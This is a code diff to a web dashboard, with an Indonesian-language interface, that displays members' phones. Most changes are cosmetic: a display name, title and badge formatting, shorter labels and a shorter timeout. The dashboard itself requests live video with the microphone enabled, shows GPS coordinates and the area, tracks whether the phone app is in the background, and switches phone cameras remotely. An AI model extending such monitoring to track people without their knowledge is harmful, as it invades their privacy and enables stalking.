@@ -193,9 +193,9 @@
       setUnlockedState(false);
     }
 
-    function formatDisplayDeviceTitle(peerId, hpBrand) {
-      const brandLabel = hpBrand ? hpBrand.toUpperCase() : "";
-      return brandLabel ? `${brandLabel} • ${peerId}` : peerId;
+    function formatDisplayDeviceTitle(d) {
+      const label = d.hpName || (d.hpBrand ? d.hpBrand.toUpperCase() : "");
+      return label ? `${label} (${d.peerId})` : d.peerId;
     }
 
     function formatAreaFromAddress(addr, displayName) {
@@ -259,7 +259,7 @@
             if (devices[id] && devices[id].conn && devices[id].conn.open && !devices[id].closedExplicitly) {
               devices[id].conn.send({ type: "REQUEST_STREAM", enableMic: true });
             }
-          }, 1500);
+          }, 1200);
         }
         syncDeviceCard(id);
       });
@@ -306,6 +306,7 @@
           if (msg.type === "HP_PRESENCE") {
             entry.closedExplicitly = false;
             entry.hpBrand = msg.hpBrand || entry.hpBrand || id.split("-")[0] || "";
+            entry.hpName = msg.hpName || entry.hpName || "";
             entry.inBackground = Boolean(msg.inBackground);
             entry.facing = msg.facing || entry.facing || "Depan";
             entry.cameraOn = msg.cameraOn !== undefined ? Boolean(msg.cameraOn) : true;
@@ -363,9 +364,11 @@
 
     function ensureDeviceEntry(id) {
       if (!devices[id]) {
+        const prefix = (id.split("-")[0] || "").toLowerCase();
         devices[id] = {
           peerId: id,
-          hpBrand: id.split("-")[0] || "",
+          hpBrand: prefix,
+          hpName: prefix ? prefix.toUpperCase() : "",
           facing: "Depan",
           cameraOn: true,
           micOn: false,
@@ -514,7 +517,7 @@
         <div class="video-wrap">
           <div class="chip-row">
             <span class="chip" id="status_${safeId}">Menunggu</span>
-            <span class="chip">${escapeHtml((d.hpBrand || "HP").toUpperCase())} • ${escapeHtml(d.peerId.slice(-4))}</span>
+            <span class="chip" id="badge_${safeId}">${escapeHtml((d.hpBrand || "HP").toUpperCase())} • ${escapeHtml(d.peerId.slice(-4))}</span>
           </div>
           <video id="vid_${safeId}" autoplay playsinline muted style="display:none;"></video>
           <div id="ph_${safeId}" class="video-placeholder">
@@ -522,10 +525,10 @@
           </div>
         </div>
         <div class="card-body">
-          <div class="device-id" id="title_${safeId}">${escapeHtml(formatDisplayDeviceTitle(d.peerId, d.hpBrand))}</div>
+          <div class="device-id" id="title_${safeId}">${escapeHtml(formatDisplayDeviceTitle(d))}</div>
           <div class="meta-line" id="streamDiag_${safeId}">🎥 Stream: Menunggu • 🎙️ Mic: Mengecek</div>
           <div class="area-line" id="area_${safeId}">🗺️ Daerah: Mendeteksi lokasi...</div>
-          <div class="meta-line" id="loc_${safeId}">📍 Menunggu koordinat akurat...</div>
+          <div class="meta-line" id="loc_${safeId}">📍 Menunggu koordinat...</div>
           <div class="meta-line" id="dev_${safeId}">📱 Perangkat</div>
           <div class="card-actions" id="act_${safeId}">
             <button class="btn-indigo btn-sm" onclick="switchDeviceCamera('${safeId}', 'user')">Depan</button>
@@ -555,7 +558,12 @@
 
       const titleEl = document.getElementById(`title_${id}`);
       if (titleEl) {
-        titleEl.textContent = formatDisplayDeviceTitle(d.peerId, d.hpBrand);
+        titleEl.textContent = formatDisplayDeviceTitle(d);
+      }
+
+      const badgeEl = document.getElementById(`badge_${id}`);
+      if (badgeEl) {
+        badgeEl.textContent = `${(d.hpBrand || "HP").toUpperCase()} • ${d.peerId.slice(-4)}`;
       }
 
       const ageMs = Date.now() - (d.updatedAt || 0);
@@ -623,8 +631,8 @@
       if (locEl) {
         const jamStr = loc && loc.timeText ? ` • Jam ${loc.timeText}` : "";
         locEl.textContent = hasCoords
-          ? `📍 ${loc.lat}, ${loc.lng} (Akurasi ${loc.accuracy || "-"}${jamStr})`
-          : "📍 Menunggu koordinat GPS dari HP member...";
+          ? `📍 ${loc.lat}, ${loc.lng} (${loc.accuracy || "-"}${jamStr})`
+          : "📍 Menunggu koordinat dari HP member...";
       }
 
       const devEl = document.getElementById(`dev_${id}`);
